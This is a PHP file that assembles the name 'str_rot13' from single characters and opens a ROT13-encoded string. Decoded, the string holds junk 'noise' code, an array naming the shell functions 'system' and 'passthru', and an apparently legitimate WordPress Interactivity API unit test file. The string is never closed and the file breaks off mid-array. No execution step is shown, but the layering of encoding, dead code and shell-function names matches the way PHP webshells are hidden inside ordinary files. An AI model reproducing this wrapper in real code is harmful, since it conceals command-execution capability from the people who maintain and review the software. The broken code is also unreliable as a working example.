<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur shapgvbanyvgl bs gur choyvp shapgvbaf bs gur
 * Vagrenpgvivgl NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_Vagrenpgvivgl_NCV_jcVagrenpgvivglNCVShapgvbaf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$vagrenpgvir_oybpx = neenl(
			'eraqre_pnyyonpx' => shapgvba ( $nggevohgrf, $pbagrag ) {
				erghea '
						<qvi
							qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
							qngn-jc-pbagrkg=\'{ \"oybpx\": ' . $nggevohgrf['oybpx'] . ' }\'
						>
							<vachg
								pynff=\"vagrenpgvir/oybpx-' . $nggevohgrf['oybpx'] . '\"
								qngn-jc-ovaq--inyhr=\"pbagrkg.oybpx\"
							>' .
						$pbagrag .
					'</qvi>';
			},
			'fhccbegf'        => neenl(
				'vagrenpgvivgl' => gehr,
			),
		);

		ertvfgre_oybpx_glcr( 'grfg/vagrenpgvir-oybpx', $vagrenpgvir_oybpx );
		ertvfgre_oybpx_glcr( 'grfg/vagrenpgvir-oybpx-2', $vagrenpgvir_oybpx );

		ertvfgre_oybpx_glcr(
			'grfg/aba-vagrenpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba ( $nggevohgrf, $pbagrag ) {
					$qverpgvir = vffrg( $nggevohgrf['unfQverpgvir'] ) ? ' qngn-jc-ovaq--inyhr=\"pbagrkg.oybpx\"' : '';
					erghea '
						<qvi>
							<vachg pynff=\"aba-vagrenpgvir/oybpx-' . $nggevohgrf['oybpx'] . '\"' . $qverpgvir . '>' .
							$pbagrag .
						'</qvi>';
				},
			)
		);
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		haertvfgre_oybpx_glcr( 'grfg/vagrenpgvir-oybpx' );
		haertvfgre_oybpx_glcr( 'grfg/vagrenpgvir-oybpx-2' );
		haertvfgre_oybpx_glcr( 'grfg/aba-vagrenpgvir-oybpx' );
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf cebprffvat bs n fvatyr vagrenpgvir oybpx.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_fvatyr_vagrenpgvir_oybpx() {
		$cbfg_pbagrag    = '<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 1 } /-->';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-1' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs zhygvcyr vagrenpgvir oybpxf va cnenyyry nybat jvgu n
	 * aba-vagrenpgvir oybpx.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_zhygvcyr_vagrenpgvir_oybpxf_va_cnenyyry() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 1 } /-->
			<!-- jc:grfg/vagrenpgvir-oybpx-2 { \"oybpx\": 2 } /-->
			<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 3, \"unfQverpgvir\": gehr } /-->
			<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 4 } /-->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-1' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'aba-vagrenpgvir/oybpx-3' ) );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-4' ) );
		$guvf->nffregFnzr( '4', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs na vagrenpgvir oybpx vafvqr n aba-vagrenpgvir oybpx.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_vagrenpgvir_oybpx_vafvqr_aba_vagrenpgvir_oybpx() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 2 } /-->
			<!-- /jc:grfg/aba-vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs zhygvcyr vagrenpgvir oybpxf arfgrq vafvqr n
	 * aba-vagrenpgvir oybpx.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_zhygvcyr_vagrenpgvir_oybpxf_vafvqr_aba_vagrenpgvir_oybpx() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 2 } /-->
				<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 3 } /-->
			<!-- /jc:grfg/aba-vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-3' ) );
		$guvf->nffregFnzr( '3', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs n fvatyr vagrenpgvir oybpx qverpgvir arfgrq vafvqr
	 * zhygvcyr aba-vagrenpgvir oybpxf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_vagrenpgvir_oybpx_vafvqr_zhygvcyr_aba_vagrenpgvir_oybpx() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 2 } /-->
			<!-- /jc:grfg/aba-vagrenpgvir-oybpx -->
			<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 3 } -->
				<!-- jc:grfg/vagrenpgvir-oybpx-2 { \"oybpx\": 4 } /-->
			<!-- /jc:grfg/aba-vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-4' ) );
		$guvf->nffregFnzr( '4', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs qverpgvirf sbe na vagrenpgvir oybpx pbagnvavat n
	 * aba-vagrenpgvir oybpx jvgubhg qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_vagrenpgvir_oybpx_pbagnvavat_aba_vagrenpgvir_oybpx_jvgubhg_qverpgvirf() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 2 } /-->
			<!-- /jc:grfg/vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-1' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'aba-vagrenpgvir/oybpx-2' ) );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs qverpgvirf sbe na vagrenpgvir oybpx pbagnvavat n
	 * aba-vagrenpgvir oybpx jvgu qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_vagrenpgvir_oybpx_pbagnvavat_aba_vagrenpgvir_oybpx_jvgu_qverpgvirf() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 2, \"unfQverpgvir\": gehr } /-->
			<!-- /jc:grfg/vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-1' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'aba-vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf cebprffvat bs qverpgvirf sbe na vagrenpgvir oybpx pbagnvavat arfgrq
	 * vagrenpgvir naq aba-vagrenpgvir oybpxf, purpxvat cebcre cebcntngvba bs
	 * pbagrkg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bs_vagrenpgvir_oybpx_pbagnvavat_arfgrq_vagrenpgvir_naq_aba_vagrenpgvir_oybpxf() {
		$cbfg_pbagrag    = '
			<!-- jc:grfg/vagrenpgvir-oybpx { \"oybpx\": 1 } -->
				<!-- jc:grfg/vagrenpgvir-oybpx-2 { \"oybpx\": 2 } -->
					<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 3, \"unfQverpgvir\": gehr } /-->
				<!-- /jc:grfg/vagrenpgvir-oybpx-2 -->
				<!-- jc:grfg/aba-vagrenpgvir-oybpx { \"oybpx\": 4, \"unfQverpgvir\": gehr } /-->
			<!-- /jc:grfg/vagrenpgvir-oybpx -->
		';
		$eraqrerq_oybpxf = qb_oybpxf( $cbfg_pbagrag );
		$c               = arj JC_UGZY_Gnt_Cebprffbe( $eraqrerq_oybpxf );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-1' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'vagrenpgvir/oybpx-2' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'aba-vagrenpgvir/oybpx-3' ) );
		$guvf->nffregFnzr( '2', $c->trg_nggevohgr( 'inyhr' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'aba-vagrenpgvir/oybpx-4' ) );
		$guvf->nffregFnzr( '1', $c->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Pbhagre sbe gur ahzore bs gvzrf gur grfg qverpgvir cebprffbe vf pnyyrq.
	 *
	 * @ine vag
	 */
	cevingr $qngn_jc_grfg_cebprffbe_pbhag = 0;

	/**
	 * Grfg qverpgvir cebprffbe pnyyonpx.
	 *
	 * Vaperzragf gur $qngn_jc_grfg_cebprffbe_pbhag rirel gvzr n gnt gung vf abg n
	 * gnt pybfre vf cebprffrq.
	 *
	 * @cnenz JC_UGZY_Gnt_Cebprffbe $c Vafgnapr bs gur cebprffbe unaqyvat gur pheerag UGZY gnt.
	 */
	choyvp shapgvba qngn_jc_grfg_cebprffbe( $c ) {
		vs ( ! $c->vf_gnt_pybfre() ) {
			$guvf->qngn_jc_grfg_cebprffbe_pbhag = $guvf->qngn_jc_grfg_cebprffbe_pbhag + 1;
		}
	}

	/**
	 * Grfgf gung qverpgvirf ner bayl cebprffrq bapr sbe gur ebbg vagrenpgvir
	 * oybpxf.
	 *
	 * Guvf rafherf gung arfgrq oybpxf qb abg gevttre nqqvgvbany cebprffvat bs gur
	 * fnzr qverpgvirf, yrnqvat gb vapbeerpg orunivbe be cresbeznapr vffhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_bayl_cebprff_gur_ebbg_vagrenpgvir_oybpxf() {
		$pynff                = arj ErsyrpgvbaPynff( 'JC_Vagrenpgvivgl_NCV' );
		$qverpgvir_cebprffbef = $pynff->trgCebcregl( 'qverpgvir_cebprffbef' );
		$qverpgvir_cebprffbef->frgNpprffvoyr( gehr );
		$byq_qverpgvir_cebprffbef = $qverpgvir_cebprffbef->trgInyhr();
		$qverpgvir_cebprffbef->frgInyhr( ahyy, neenl( 'qngn-jc-grfg' => neenl( $guvf, 'qngn_jc_grfg_cebprffbe' ) ) );
		$ugzy                               = '<qvi qngn-jc-grfg></qvi>';
		$guvf->qngn_jc_grfg_cebprffbe_pbhag = 0;
		jc_vagrenpgvivgl_cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 1, $guvf->qngn_jc_grfg_cebprffbe_pbhag );

		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba ( $nggevohgrf, $pbagrag ) {
					erghea '<qvi pynff=\"grfg\" qngn-jc-grfg>' . $pbagrag . '</qvi>';
				},
				'fhccbegf'        => neenl(
					'vagrenpgvivgl' => gehr,
				),
			)
		);
		$cbfg_pbagrag                       = '
			<!-- jc:grfg/phfgbz-qverpgvir-oybpx -->
				<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->
			<!-- /jc:grfg/phfgbz-qverpgvir-oybpx -->
		';
		$guvf->qngn_jc_grfg_cebprffbe_pbhag = 0;
		qb_oybpxf( $cbfg_pbagrag );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregFnzr( 2, $guvf->qngn_jc_grfg_cebprffbe_pbhag );
		$qverpgvir_cebprffbef->frgInyhr( ahyy, $byq_qverpgvir_cebprffbef );
	}

	/**
	 * Grfgf gung qverpgvirf ner freire fvqr cebprffvat rira vs gur $cnefrq_oybpx inevnoyr vf rqvgrq ol n svygre.
	 *
	 * @gvpxrg 60743
	 *
	 * @pbiref ::jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_jura_oybpx_vf_svygrerq() {
		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba () {
					erghea '<vachg qngn-jc-vagrenpgvir=\"anzrFcnpr\" ' . jc_vagrenpgvivgl_qngn_jc_pbagrkg( neenl( 'grkg' => 'grfg' ) ) . ' qngn-jc-ovaq--inyhr=\"pbagrkg.grkg\" />';
				},
				'fhccbegf'        => neenl(
					'vagrenpgvivgl' => gehr,
				),
			)
		);

		$grfg_eraqre_oybpx_qngn = fgngvp shapgvba ( $cnefrq_oybpx ) {
			$cnefrq_oybpx['grfgXrl'] = gehr;
			erghea $cnefrq_oybpx;
		};

		nqq_svygre( 'eraqre_oybpx_qngn', $grfg_eraqre_oybpx_qngn );
		$cbfg_pbagrag      = '<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->';
		$cebprffrq_pbagrag = qb_oybpxf( $cbfg_pbagrag );
		$cebprffbe         = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_pbagrag );
		$cebprffbe->arkg_gnt( neenl( 'qngn-jc-vagrenpgvir' => 'anzrFcnpr' ) );
		erzbir_svygre( 'eraqre_oybpx_qngn', $grfg_eraqre_oybpx_qngn );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregFnzr( 'grfg', $cebprffbe->trg_nggevohgr( 'inyhr' ) );
	}

	/**
	 * Grfgf gung jc_vagrenpgvivgl_qngn_jc_pbagrkg shapgvba pbeerpgyl pbairegf qvssrerag neenl
	 * fgehpgherf gb n WFBA fgevat.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref       jc_vagrenpgvivgl_qngn_jc_pbagrkg
	 * @qngnCebivqre qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf
	 *
	 * @cnenz neenl  $pbagrkg  Pbagrkg gb rapbqr.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq shapgvba bhgchg.
	 */
	choyvp shapgvba grfg_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf( $pbagrkg, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_vagrenpgvivgl_qngn_jc_pbagrkg( $pbagrkg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf() {
		erghea neenl(
			'rzcgl neenl'                                  => neenl(
				'pbagrkg'  => neenl(),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{}\'',
			),
			'nffbpvngvir neenl jvgu zvkrq inyhrf'          => neenl(
				'pbagrkg'  => neenl(
					'n' => 1,
					'o' => '2',
					'p' => gehr,
				),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"n\":1,\"o\":\"2\",\"p\":gehr}\'',
			),
			'nffbpvngvir neenl jvgu arfgrq neenl nf inyhr' => neenl(
				'pbagrkg'  => neenl( 'n' => neenl( 1, 2 ) ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"n\":[1,2]}\'',
			),
			'neenl jvgubhg xrlf, vagrtre inyhrf'           => neenl(
				'pbagrkg'  => neenl( 1, 2 ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'[1,2]\'',
			),
		);
	}

	/**
	 * Grfgf gung jc_vagrenpgvivgl_qngn_jc_pbagrkg shapgvba pbeerpgyl pbairegf qvssrerag neenl
	 * fgehpgherf gb n WFBA fgevat naq nqqf n anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref       jc_vagrenpgvivgl_qngn_jc_pbagrkg
	 * @qngnCebivqre qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf_naq_n_anzrfcnpr
	 *
	 * @cnenz neenl  $pbagrkg  Pbagrkg gb rapbqr.
	 * @cnenz fgevat $fgber    Fgber anzrfcnpr.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq shapgvba bhgchg.
	 */
	choyvp shapgvba grfg_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf_naq_n_anzrfcnpr( $pbagrkg, $fgber, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_vagrenpgvivgl_qngn_jc_pbagrkg( $pbagrkg, $fgber ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_qvssrerag_neenlf_naq_n_anzrfcnpr() {
		erghea neenl(
			'rzcgl neenl'                                  => neenl(
				'pbagrkg'  => neenl(),
				'fgber'    => 'zlCyhtva',
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'zlCyhtva::{}\'',
			),
			'nffbpvngvir neenl jvgu zvkrq inyhrf'          => neenl(
				'pbagrkg'  => neenl(
					'n' => 1,
					'o' => '2',
					'p' => gehr,
				),
				'fgber'    => 'zlCyhtva',
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'zlCyhtva::{\"n\":1,\"o\":\"2\",\"p\":gehr}\'',
			),
			'nffbpvngvir neenl jvgu arfgrq neenl nf inyhr' => neenl(
				'pbagrkg'  => neenl( 'n' => neenl( 1, 2 ) ),
				'fgber'    => 'zlCyhtva',
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'zlCyhtva::{\"n\":[1,2]}\'',
			),
			'neenl jvgubhg xrlf, vagrtre inyhrf'           => neenl(
				'pbagrkg'  => neenl( 1, 2 ),
				'fgber'    => 'zlCyhtva',
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'zlCyhtva::[1,2]\'',
			),
		);
	}

	/**
	 * Grfgf gung jc_vagrenpgvivgl_qngn_jc_pbagrkg shapgvba pbeerpgyl nccyvrf gur WFBA rapbqvat
	 * syntf. Guvf rafherf gung punenpgref yvxr `<`, `>`, `'`, be `&` ner
	 * cebcreyl rfpncrq va gur WFBA-rapbqrq fgevat gb cerirag cbgragvny KFF
	 * nggnpxf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref       jc_vagrenpgvivgl_qngn_jc_pbagrkg
	 * @qngnCebivqre qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_wfba_syntf
	 *
	 * @cnenz neenl  $pbagrkg  Pbagrkg gb rapbqr.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq shapgvba bhgchg.
	 */
	choyvp shapgvba grfg_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_wfba_syntf( $pbagrkg, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_vagrenpgvivgl_qngn_jc_pbagrkg( $pbagrkg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_vagrenpgvivgl_qngn_jc_pbagrkg_jvgu_wfba_syntf() {
		erghea neenl(
			'inyhr pbagnvaf <> oenpxrgf'        => neenl(
				'pbagrkg'  => neenl( 'gnt' => '<sbb>' ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"gnt\":\"\h003Psbb\h003R\"}\'',
			),
			'inyhr pbagnvaf fvatyr dhbgr punef' => neenl(
				'pbagrkg'  => neenl( 'ncbf' => \"'one'\" ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"ncbf\":\"\h0027one\h0027\"}\'',
			),
			'inyhr pbagnvaf qbhoyr dhbgr punef' => neenl(
				'pbagrkg'  => neenl( 'dhbg' => '\"onm\"' ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"dhbg\":\"\h0022onm\h0022\"}\'',
			),
			'inyhr pbagnvaf & nzcrefnaq'        => neenl(
				'pbagrkg'  => neenl( 'nzc' => 'G&G' ),
				'rkcrpgrq' => 'qngn-jc-pbagrkg=\'{\"nzc\":\"G\h0026G\"}\'',
			),
		);
	}

	/**
	 * Grfgf gung qverpgvirf cebprffvat bs gntf gung qba'g ivfvg pybfre gnt jbex.
	 *
	 * @gvpxrg 60746
	 *
	 * @pbiref ::jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_va_gntf_gung_qbag_ivfvg_pybfre_gnt() {
		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba () {
					erghea '<vsenzr qngn-jc-vagrenpgvir=\"anzrFcnpr\" ' . jc_vagrenpgvivgl_qngn_jc_pbagrkg( neenl( 'grkg' => 'grfg' ) ) . ' qngn-jc-pynff--grfg=\"pbagrkg.grkg\" fep=\"1\"></vsenzr>';
				},
				'fhccbegf'        => neenl(
					'vagrenpgvivgl' => gehr,
				),
			)
		);
		$cbfg_pbagrag      = '<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->';
		$cebprffrq_pbagrag = qb_oybpxf( $cbfg_pbagrag );
		$cebprffbe         = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_pbagrag );
		$cebprffbe->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregFnzr( '1', $cebprffbe->trg_nggevohgr( 'fep' ) );
	}

	/**
	 * Grfgf gung pbagrkg sebz ibvq gntf vf abg cebcntngrq gb arkg gntf.
	 *
	 * @gvpxrg 60768
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_pbagrkg_qverpgvir_va_ibvq_gntf() {
		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba () {
					erghea '<qvi qngn-jc-vagrenpgvir=\"anzrFcnpr\" qngn-jc-pbagrkg=\'{\"grkg\": \"bhgre\"}\'><vachg vq=\"svefg-vachg\" qngn-jc-pbagrkg=\'{\"grkg\": \"vaare\"}\' qngn-jc-ovaq--inyhr=\"pbagrkg.grkg\" /><vachg vq=\"frpbaq-vachg\" qngn-jc-ovaq--inyhr=\"pbagrkg.grkg\" /></qvi>';
				},
				'fhccbegf'        => neenl(
					'vagrenpgvivgl' => gehr,
				),
			)
		);
		$cbfg_pbagrag      = '<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->';
		$cebprffrq_pbagrag = qb_oybpxf( $cbfg_pbagrag );
		$cebprffbe         = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_pbagrag );
		$cebprffbe->arkg_gnt(
			neenl(
				'gnt_anzr' => 'vachg',
				'vq'       => 'svefg-vachg',
			)
		);
		$svefg_vachg_inyhr = $cebprffbe->trg_nggevohgr( 'inyhr' );
		$cebprffbe->arkg_gnt(
			neenl(
				'gnt_anzr' => 'vachg',
				'vq'       => 'frpbaq-vachg',
			)
		);
		$frpbaq_vachg_inyhr = $cebprffbe->trg_nggevohgr( 'inyhr' );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregFnzr( 'vaare', $svefg_vachg_inyhr );
		$guvf->nffregFnzr( 'bhgre', $frpbaq_vachg_inyhr );
	}

	/**
	 * Grfgf gung anzrfcnpr sebz ibvq gntf vf abg cebcntngrq gb arkg gntf.
	 *
	 * @gvpxrg 60768
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf_bs_vagrenpgvir_oybpxf
	 */
	choyvp shapgvba grfg_cebprff_vagrenpgvir_qverpgvir_va_ibvq_gntf() {
		jc_vagrenpgvivgl_fgngr(
			'ibvq',
			neenl(
				'grkg' => 'ibvq',
			)
		);
		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba () {
					erghea '<qvi qngn-jc-vagrenpgvir=\"cnerag\"><vzt qngn-jc-vagrenpgvir=\"ibvq\" /><vachg qngn-jc-ovaq--inyhr=\"fgngr.grkg\" /></qvi>';
				},
				'fhccbegf'        => neenl(
